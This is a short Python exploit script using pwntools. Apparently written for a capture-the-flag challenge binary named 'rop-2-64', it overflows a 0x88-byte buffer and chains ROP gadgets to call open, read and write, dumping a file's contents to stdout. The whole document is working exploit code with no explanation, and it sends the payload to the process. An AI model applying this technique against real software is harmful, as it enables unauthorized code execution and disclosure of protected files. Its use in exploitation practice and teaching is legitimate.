#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-64")


rd = p64(0x4004f0)
opn = p64(0x400510)
wr = p64(0x4004d0)

string = p64(0x400020)

pop_rdi_ret = p64(0x400743)
#pop_rdx_nop_pop_rbp_ret = p64(0x4006d8)
pop_rsi_r15_ret = p64(0x400741)
pop_rdx_ret = p64(0x400668)

buf = "A" * 0x80 + "A" * 8

buf += pop_rdi_ret
buf += string
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(0)
buf += opn


buf += pop_rdi_ret
buf += p64(3)
buf += pop_rsi_r15_ret
buf += p64(0x601a00)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(100)
buf += rd


buf += pop_rdi_ret
buf += p64(1)
buf += pop_rsi_r15_ret
buf += p64(0x601a00)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(100)
buf += wr

with open("exploit.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)
p.interactive()

